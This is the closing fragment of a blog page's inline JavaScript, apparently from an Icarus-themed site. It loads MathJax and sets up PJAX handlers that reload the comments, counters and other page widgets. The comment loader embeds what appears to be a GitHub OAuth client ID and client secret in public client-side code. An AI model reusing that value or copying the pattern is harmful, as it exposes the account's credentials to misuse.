            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(true){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('Ov23liIz1bPooLBfW0Cm','8f8f49427fa732912dade765d516294e964b4f41','LuffyS93','Comments_of_blog',false);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>